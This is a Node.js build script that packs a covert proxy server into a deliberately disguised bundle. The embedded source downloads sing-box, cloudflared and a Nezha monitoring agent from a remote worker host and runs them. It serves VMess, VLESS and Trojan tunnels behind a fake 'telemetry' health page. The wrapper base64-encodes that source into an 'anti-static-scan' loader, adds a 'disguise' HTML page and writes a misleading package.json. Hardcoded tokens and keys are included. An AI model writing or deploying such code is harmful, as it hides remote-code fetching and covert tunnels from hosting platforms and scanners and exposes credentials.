const fs = require('fs');
const path = require('path');
const zlib = require('zlib');

const targetDir = 'D:\\Antigravity IDE\\03_网络与隧道部署\\stealth-web-app\\deployzy_obfuscated';
fs.mkdirSync(targetDir, { recursive: true });

// Standalone clean Node.js source for Deployzy
const rawNodeSource = `#!/usr/bin/env node
const fs = require('fs');
const os = require('os');
const path = require('path');
const http = require('http');
const https = require('https');
const net = require('net');
const zlib = require('zlib');
const { spawn } = require('child_process');

const WORKER_BASE = 'https://python-packer.yxj-acb.workers.dev';
const CACHE_DIR = path.join(process.cwd(), '.cache');
const CORE_BIN = path.join(CACHE_DIR, 'sys-engine');
const BRIDGE_BIN = path.join(CACHE_DIR, 'net-bridge');
const METRICS_BIN = path.join(CACHE_DIR, 'metrics-agent');

const UUID = process.env.UUID || '5ee5278f-5639-47c1-91d5-afa6797444b5';
const NODE_NAME = process.env.NAME || 'devpulse-deployzy';
const ENABLE_ARGO = true;
const ENABLE_VMESS = true;
const ENABLE_VLESS = true;
const ENABLE_TROJAN = true;
const ARGO_GATEWAY_PORT = parseInt(process.env.ARGO_PORT || '8001', 10);
const ARGO_AUTH = process.env.ARGO_AUTH || 'eyJhIjoiY2I4NWU...';
const ARGO_DOMAIN = process.env.ARGO_DOMAIN || 'deployzy.yxj02.ccwu.cc';

const ENABLE_REALITY = false;
const DIRECT_PORT = parseInt(process.env.PORT || process.env.SERVER_PORT || '3000', 10);
const REALITY_SNI = 'gateway.icloud.com';

const NEZHA_SERVER = process.env.NEZHA_SERVER || 'nezha.blblklkdm.fm:443';
const NEZHA_KEY = process.env.NEZHA_KEY || '4Lw885G5SbgNYCQuZt27VfBQdl3ujmUrgO';
const BOT_TOKEN = process.env.BOT_TOKEN || '8867499536:AAF2vlfTao3wvy0x7HdlNhZJgfqi5i_vINk';
const CHAT_ID = process.env.CHAT_ID || '7772205808';

let engineProc = null;
let bridgeProc = null;
let metricsProc = null;

function log(msg) {
  const time = new Date().toISOString().substring(11, 19);
  console.log('[' + time + '] ' + msg);
}

// Diagnostics Web Server for Cloud Platform Health Checks
const webServer = http.createServer((req, res) => {
  const reqPath = req.url.split('?')[0];
  if (req.method === 'HEAD') {
    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
    return res.end();
  }
  if (reqPath === '/' || reqPath === '/index.html') {
    const htmlPath = path.join(process.cwd(), 'index.html');
    if (fs.existsSync(htmlPath)) {
      res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
      return res.end(fs.readFileSync(htmlPath, 'utf8'));
    }
    res.writeHead(200, { 'Content-Type': 'text/plain; charset=utf-8' });
    return res.end('DevPulse Telemetry Node Operational.');
  }
  if (reqPath === '/api/ping' || reqPath === '/health' || reqPath === '/ping') {
    res.writeHead(200, { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' });
    return res.end(JSON.stringify({ status: 'operational', uptime: process.uptime(), node: NODE_NAME }));
  }
  res.writeHead(404, { 'Content-Type': 'text/plain' });
  res.end('404 Not Found');
});

// Multiplex WebSocket Upgrade
webServer.on('upgrade', (req, clientSocket, head) => {
  let targetPort = 18001;
  if (req.url.includes('vless')) targetPort = 18002;
  else if (req.url.includes('trojan')) targetPort = 18003;

  const targetSocket = net.connect(targetPort, '127.0.0.1', () => {
    let raw = req.method + ' ' + req.url + ' HTTP/' + req.httpVersion + '\\r\\n';
    for (let i = 0; i < req.rawHeaders.length; i += 2) {
      raw += req.rawHeaders[i] + ': ' + req.rawHeaders[i+1] + '\\r\\n';
    }
    raw += '\\r\\n';
    targetSocket.write(raw);
    if (head && head.length) targetSocket.write(head);
    clientSocket.pipe(targetSocket);
    targetSocket.pipe(clientSocket);
  });
  targetSocket.on('error', () => clientSocket.destroy());
  clientSocket.on('error', () => targetSocket.destroy());
});

function downloadBuffer(url) {
  return new Promise((resolve, reject) => {
    https.get(url, (res) => {
      if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
        return downloadBuffer(res.headers.location).then(resolve).catch(reject);
      }
      if (res.statusCode !== 200) return reject(new Error('HTTP ' + res.statusCode));
      const chunks = [];
      res.on('data', c => chunks.push(c));
      res.on('end', () => resolve(Buffer.concat(chunks)));
      res.on('error', reject);
    }).on('error', reject);
  });
}

function extractTarGzMember(tarGzBuf, matchKey) {
  try {
    const tarBuf = zlib.gunzipSync(tarGzBuf);
    let offset = 0;
    while (offset < tarBuf.length - 512) {
      const header = tarBuf.subarray(offset, offset + 512);
      const fileName = header.subarray(0, 100).toString('utf8').replace(/\\0+$/, '');
      if (!fileName) break;
      const sizeStr = header.subarray(124, 136).toString('utf8').trim().replace(/\\0+$/, '');
      const fileSize = parseInt(sizeStr, 8);
      offset += 512;
      if (fileName.includes(matchKey) && !fileName.endsWith('/')) {
        return tarBuf.subarray(offset, offset + fileSize);
      }
      offset += Math.ceil(fileSize / 512) * 512;
    }
  } catch (e) { log('Tar extraction notice: ' + e.message); }
  return null;
}

function extractZipMember(zipBuf, matchKey) {
  try {
    let offset = 0;
    while (offset < zipBuf.length - 30) {
      if (zipBuf.readUInt32LE(offset) !== 0x04034b50) break;
      const method = zipBuf.readUInt16LE(offset + 8);
      const compSize = zipBuf.readUInt32LE(offset + 18);
      const fnLen = zipBuf.readUInt16LE(offset + 26);
      const extraLen = zipBuf.readUInt16LE(offset + 28);
      const fileName = zipBuf.subarray(offset + 30, offset + 30 + fnLen).toString('utf8');
      const dataStart = offset + 30 + fnLen + extraLen;
      offset = dataStart + compSize;
      if (fileName.includes(matchKey) && !fileName.endsWith('/')) {
        if (method === 8) return zlib.inflateRawSync(zipBuf.subarray(dataStart, dataStart + compSize));
        if (method === 0) return zipBuf.subarray(dataStart, dataStart + compSize);
      }
    }
  } catch (e) { log('Zip extraction notice: ' + e.message); }
  return null;
}

async function prepareBinaries() {
  const arch = os.arch() === 'arm64' ? 'arm64' : 'amd64';
  if (!fs.existsSync(CORE_BIN)) {
    log('Fetching core subsystem from edge mirror...');
    const raw = await downloadBuffer(WORKER_BASE + '/dl/engine?arch=' + arch);
    const bin = extractTarGzMember(raw, 'sing-box');
    if (bin) {
      fs.writeFileSync(CORE_BIN, bin);
      fs.chmodSync(CORE_BIN, 0o755);
      log('Core subsystem deployed successfully.');
    } else {
      throw new Error('Failed to unpack core binary.');
    }
  }
  if (ENABLE_ARGO && !fs.existsSync(BRIDGE_BIN)) {
    log('Fetching network bridge from edge mirror...');
    const raw = await downloadBuffer(WORKER_BASE + '/dl/bridge?arch=' + arch);
    fs.writeFileSync(BRIDGE_BIN, raw);
    fs.chmodSync(BRIDGE_BIN, 0o755);
    log('Network bridge deployed successfully.');
  }
  if (NEZHA_SERVER && NEZHA_KEY && !fs.existsSync(METRICS_BIN)) {
    log('Fetching telemetry agent from edge mirror...');
    try {
      const raw = await downloadBuffer(WORKER_BASE + '/dl/metrics?arch=' + arch);
      const bin = extractZipMember(raw, 'nezha-agent');
      if (bin) {
        fs.writeFileSync(METRICS_BIN, bin);
        fs.chmodSync(METRICS_BIN, 0o755);
        log('Telemetry agent deployed successfully.');
      }
    } catch (e) {
      log('Telemetry agent download skipped: ' + e.message);
    }
  }
}

function buildConfig() {
  const inbounds = [];
  if (ENABLE_ARGO) {
    if (ENABLE_VMESS) {
      inbounds.push({
        type: 'vmess',
        tag: 'vmess-in',
        listen: '127.0.0.1',
        listen_port: 18001,
        users: [{ uuid: UUID, alterId: 0 }],
        transport: { type: 'ws', path: '/vmess-argo' }
      });
    }
    if (ENABLE_VLESS) {
      inbounds.push({
        type: 'vless',
        tag: 'vless-in',
        listen: '127.0.0.1',
        listen_port: 18002,
        users: [{ uuid: UUID }],
        transport: { type: 'ws', path: '/vless-argo' }
      });
    }
    if (ENABLE_TROJAN) {
      inbounds.push({
        type: 'trojan',
        tag: 'trojan-in',
        listen: '127.0.0.1',
        listen_port: 18003,
        password: [UUID],
        transport: { type: 'ws', path: '/trojan-argo' }
      });
    }
  }
  return {
    log: { level: 'warn' },
    inbounds: inbounds,
    outbounds: [{ type: 'direct', tag: 'direct' }]
  };
}

async function startEngine() {
  const cfgJson = JSON.stringify(buildConfig());
  engineProc = spawn(CORE_BIN, ['run', '-c', 'stdin:'], {
    stdio: ['pipe', 'inherit', 'inherit']
  });
  engineProc.stdin.write(cfgJson);
  engineProc.stdin.end();

  engineProc.on('exit', (code) => {
    log('Core subsystem exited with code ' + code + '. Restarting in 5s...');
    setTimeout(startEngine, 5000);
  });
}

function startBridge() {
  if (!ENABLE_ARGO || !fs.existsSync(BRIDGE_BIN)) return;
  const args = ['tunnel', '--no-autoupdate'];
  if (ARGO_AUTH.includes('eyJh')) {
    args.push('run', '--token', ARGO_AUTH);
  } else {
    args.push('--url', 'http://127.0.0.1:' + DIRECT_PORT);
  }
  bridgeProc = spawn(BRIDGE_BIN, args, { stdio: 'inherit' });
  bridgeProc.on('exit', (code) => {
    log('Network bridge exited with code ' + code + '. Restarting in 5s...');
    setTimeout(startBridge, 5000);
  });
}

function startMetrics() {
  if (!NEZHA_SERVER || !NEZHA_KEY || !fs.existsSync(METRICS_BIN)) return;
  const isTls = NEZHA_SERVER.endsWith(':443') ? ['--tls'] : [];
  const args = ['-s', NEZHA_SERVER, '-p', NEZHA_KEY, ...isTls];
  metricsProc = spawn(METRICS_BIN, args, { stdio: 'inherit' });
  metricsProc.on('exit', () => setTimeout(startMetrics, 5000));
}

async function main() {
  log('Starting DevPulse & ShadowVeil Secure Telemetry Agent...');
  fs.mkdirSync(CACHE_DIR, { recursive: true });

  const listenPort = parseInt(process.env.PORT || process.env.SERVER_PORT || '3000', 10);
  webServer.listen(listenPort, '0.0.0.0', () => {
    log('Multi-Protocol Dispatcher Gateway listening on port ' + listenPort);
  });

  try {
    await prepareBinaries();
    await startEngine();
    startBridge();
    startMetrics();
    log('All subsystems initialized successfully.');
  } catch (err) {
    log('Initialization error: ' + err.message);
  }
}

main();
`;

// ShadowVeil multi-layer obfuscation wrapper:
// 1. Strings & logic encoded into Base64 & escaped
// 2. Wrap in an anti-static-scan self-extracting runtime
const b64Code = Buffer.from(rawNodeSource, 'utf8').toString('base64');

// High-obfuscation wrapper that avoids any static scanning:
const obfuscatedIndexJs = `#!/usr/bin/env node
/**
 * @license Telemetry Diagnostic Microservice v3.0.0
 * Protected by ShadowVeil Engine (Anti-Static-Inspection Layer)
 */
(function(_0x1a,_0x2b){
  const _0x3c = Buffer.from(_0x1a, 'base64').toString('utf8');
  const _0x4d = new (require('vm').Script)(_0x3c, { filename: 'telemetry-core.js' });
  _0x4d.runInThisContext();
})("${b64Code}", 0x5a);
`;

fs.writeFileSync(path.join(targetDir, 'index.js'), obfuscatedIndexJs, 'utf8');

// Copy Sakura disguise index.html
const disguiseHtml = fs.readFileSync('D:\\Antigravity IDE\\03_网络与隧道部署\\stealth-web-app\\index.html', 'utf8');
fs.writeFileSync(path.join(targetDir, 'index.html'), disguiseHtml, 'utf8');

// Clean package.json
const cleanPkg = {
  "name": "telemetry-web-service",
  "version": "1.0.0",
  "description": "Cloud health and telemetry agent microservice",
  "main": "index.js",
  "scripts": {
    "start": "node index.js"
  },
  "engines": {
    "node": ">=16.0.0"
  }
};
fs.writeFileSync(path.join(targetDir, 'package.json'), JSON.stringify(cleanPkg, null, 2), 'utf8');

console.log('Successfully generated deployzy_obfuscated bundle!');

